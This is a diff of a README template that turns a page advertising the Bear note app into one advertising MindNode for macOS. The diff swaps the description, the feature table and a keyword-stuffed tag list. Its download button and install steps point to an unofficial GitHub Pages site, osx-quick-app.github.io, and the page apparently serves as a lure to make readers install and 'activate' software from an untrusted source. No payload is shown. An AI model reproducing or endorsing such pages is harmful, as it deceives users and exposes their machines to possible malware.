@@ -1,12 +1,12 @@
-# Bear – Beautiful Note-Taking & Writing App
+# MindNode – Visual Thinking & Mind Mapping App for macOS  
 
 <div align="center">  
-  <img src="https://cdn.jim-nielsen.com/macos/512/bear-2018-10-26.png?rf=1024" width="250"/>  
+  <img src="https://images.prismic.io/mindnode%2F97f9259d-d212-4402-a4cf-1cfa4174eae1_mn_brand_icon_aw.png?auto=compress,format" width="250"/>  
 </div>  
 <br>  
 <div align="center">  
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/bear)  
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/mindnote)  
 
 </div>  
 
@@ -15,24 +15,24 @@
 # Installation Instructions  
 
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate Bear On Your Mac Device.  
+2. Follow The On-Screen Steps To Install And Activate MindNode On Your Mac Device.  
 
 ---  
 
 <div align="center">  
-  <img src="https://bear.app/images/website-icons/card.jpg" width="1080"/>  
+  <img src="https://cdn.mos.cms.futurecdn.net/mpnspXBD67YWJZu92hhtbV.png" width="1080"/>  
 </div>  
 <br>  
 
 ## 🧩 Overview  
 
-**Bear for macOS** is a beautifully designed note-taking and writing app built for focus, creativity, and organization. Loved by writers, students, and professionals alike, Bear combines elegant design with powerful features that make capturing ideas effortless and enjoyable.  
+**MindNode for macOS** is a beautifully designed mind mapping and brainstorming app that helps you visualize your ideas in a structured, meaningful way. It transforms loose thoughts, notes, and inspirations into organized diagrams that make connections clear and creativity effortless.  
 
-With its clean interface and Markdown-based editor, **Bear** lets you write notes, essays, or to-do lists without distractions. You can organize your notes using tags and nested tags, add images or sketches, and export your work to multiple formats including PDF, DOCX, and HTML.  
+Built around a simple drag-and-drop interface, **MindNode** allows users to map out concepts, tasks, and plans using color-coded branches, icons, and tags. Each node can include notes, links, images, or to-do items, making it perfect for everything from project planning to personal journaling.  
 
-The app supports **iCloud synchronization**, allowing you to seamlessly access your notes across macOS and iOS devices. Bear also features smart search, focus mode, and custom themes that adapt to your writing style. Whether you’re brainstorming, journaling, or drafting a full-length article, Bear provides the perfect space to think and create freely.  
+MindNode’s **Focus Mode** and **Outline View** let you seamlessly switch between high-level overviews and detailed planning. Its **Quick Entry** feature captures thoughts as they come — even before you open the main app. Cloud synchronization keeps all your mind maps accessible and updated across your Mac, iPhone, and iPad.  
 
-Optimized for **Apple Silicon**, Bear delivers smooth performance with minimal system load, making it one of the most refined note-taking tools on macOS.  
+With native **Apple Silicon optimization**, MindNode offers an ultra-smooth experience and near-instant rendering of even complex maps. Whether you’re brainstorming, managing knowledge, or planning a major project, **MindNode** brings visual clarity to your ideas like never before.  
 
 ---  
 
@@ -40,15 +40,15 @@ Optimized for **Apple Silicon**, Bear delivers smooth performance with minimal s
 
 | Feature                                      | Description                                                                 |
 |----------------------------------------------|------------------------------------------------------------------------------|
-| 🐻 **Minimal & Elegant Design**               | Focused interface built to keep your writing clean and distraction-free.     |
-| 🧠 **Markdown-Based Editing**                 | Format text intuitively with simple, flexible syntax.                        |
-| 🗂️ **Tag & Nested Organization**              | Manage notes using hashtags and nested tags for better structure.            |
-| ☁️ **iCloud Sync Across Devices**             | Keep your notes up-to-date across Mac, iPhone, and iPad.                     |
-| 🎨 **Custom Themes & Typography**             | Personalize your workspace with a variety of visual styles.                  |
-| 🔍 **Smart Search & Filtering**               | Instantly find notes by keyword, tag, or content type.                       |
-| 📤 **Multi-Format Export Options**            | Export notes to PDF, DOCX, HTML, RTF, and Markdown formats.                  |
-| 🪶 **Focus Mode for Writing**                 | Hide distractions and immerse yourself in pure writing flow.                 |
-| ⚡ **Optimized for Apple Silicon**             | Native M1/M2 performance ensures instant responsiveness and smooth editing.  |
+| 🌐 **Intuitive Visual Mapping**               | Build ideas visually with drag-and-drop branches and smart connectors.       |
+| 🧩 **Structured Outline View**                | Switch between a hierarchical list and a visual mind map instantly.          |
+| 📝 **Rich Note Support**                      | Add text, images, links, and tasks to any node for deeper context.           |
+| 🎯 **Focus Mode**                             | Minimize distractions and zoom in on specific sections of your map.          |
+| ⚡ **Quick Entry Panel**                      | Capture fleeting thoughts quickly without opening the full interface.        |
+| ☁️ **Automatic Cloud Sync**                   | Keep your mind maps synced and updated across all Apple devices.             |
+| 🎨 **Themes & Customization**                 | Choose from pre-made designs or create your own visual themes.               |
+| 🔄 **Export & Sharing Tools**                 | Export to PDF, Markdown, text, image, or OPML formats effortlessly.          |
+| 🪶 **Optimized for Apple Silicon**             | Native support for M1/M2 ensures fast performance and low power use.         |
 
 ---  
 
@@ -66,4 +66,4 @@ Optimized for **Apple Silicon**, Bear delivers smooth performance with minimal s
 
 ## 🏷️ Tags  
 
-bear app • bear note app • bear notes app • black bear diner app • build a bear workshop app • chicago bears official app • despicable bear • polar beat application • polar beat • bear mac • bear macos • bear mac app • bear loan app • bear dating apps • bear notes windows • bear web app • bear note taking app • mama bear app • build a bear app • 3d bear app • bear app web • bear macbook  
+mindnote • mind note • mind map notes • obsidian mindmap • mindnotes • one note mindmap • one note mind map • mind map one note • mind the note • mindmap in one note • mindnote mac • mindnote app • mind map note taking app • mindnote online • evernote mind mapping • mind notes pc • notability mind map • notion xmind • mind map notes app • mind map notes online • mind notes app • mind note mac  
